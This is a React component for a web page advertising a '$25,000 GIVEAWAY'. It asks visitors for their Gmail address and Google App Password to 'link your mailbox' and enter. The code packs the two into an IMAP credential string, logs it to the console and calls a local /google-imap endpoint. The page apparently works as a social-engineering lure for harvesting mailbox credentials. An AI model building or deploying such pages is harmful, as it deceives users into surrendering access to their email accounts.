import React, { useState } from 'react';
import './FinalPage.css';
import gmailicon from './icons/gmail.png';
import { Link } from 'react-router-dom';
import globals from './globals.js';
import axios from 'axios';


function FinalPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isValidInputs, setIsValidInputs] = useState(false);

  function validateEmail(email) {
    const emailRegex = /\S+@\S+\.\S+/;
    return emailRegex.test(email);
  }

  function validatePassword(password) {
    // Check if password has exactly 16 digits
    const passRegex = /^[a-zA-Z]{16}$/;
    return passRegex.test(password);
  }
  
  function validateInputs() {  
    if (email.trim() === '') {
      alert('Please enter an email address.');
      return;
    }
    if (password.trim() === '') {
      alert('Please enter a 16-digit Google App Password.');
      return;
    }
  
    const validEmail = validateEmail(email);
    const validPassword = validatePassword(password);
  
    if (validEmail && validPassword) {
      globals.setProvider("gmail-imap");
      console.log("Provider set to: ", globals.getProvider());
      globals.setImap(email + ":" + password);


      console.log(globals); 
    console.log(globals.getProvider());

      axios.get('http://localhost:3000/google-imap')
        .then((response) => {
          console.log(response.data);
        })
        .catch((error) => {
          console.error(error);
      });

      setIsValidInputs(true);

    } else {
      setIsValidInputs(false);
      if (!validEmail) {
        alert('Please enter a valid email address.');
      } else if (!validPassword) {
        alert('Please enter a 16-digit Google App Password.');
      }
    }
  }

  return (
    <div className='final-page-container'>
      <div className='final-page-banner'>$25,000 GIVEAWAY</div>
      <div className='final-page-content'>
        <img src={gmailicon} alt="Gmail" className='final-page-logo' />
        <div>
          <p className='final-page-h1'>Final Step!</p>
          <p className='final-page-h2'>Enter your app password below and hit <strong>"enter with gmail"</strong> to link your mailbox and enter the giveaway.</p>
        </div>
        <div className='final-page-input'>
          <p><strong>Enter Your Email Address:</strong></p>
          <input
            type="email"
            placeholder="rewardslover2023@gmail.com"
            value={email}
            onChange={(e) => setEmail(e.target.value.trim())}
          />
        </div>
        <div className='final-page-input'>
          <p><strong>Enter your 16-digit Google App Password:</strong></p>
          <input
            type="password"
            placeholder="hpit pili tqud bkhg"
            value={password}
            onChange={(e) => setPassword(e.target.value.trim())}
          />
        </div>
        {isValidInputs ? (
          <Link to="/success">
            <button className='final-page-button'>ENTER THE SWEEPSTAKES!</button>
          </Link>
        ) : (
          <button className='final-page-button' onClick={validateInputs} disabled={!email || !password}>
            ENTER THE SWEEPSTAKES!
          </button>
        )}
      </div>
    </div>
  );
}

export default FinalPage;
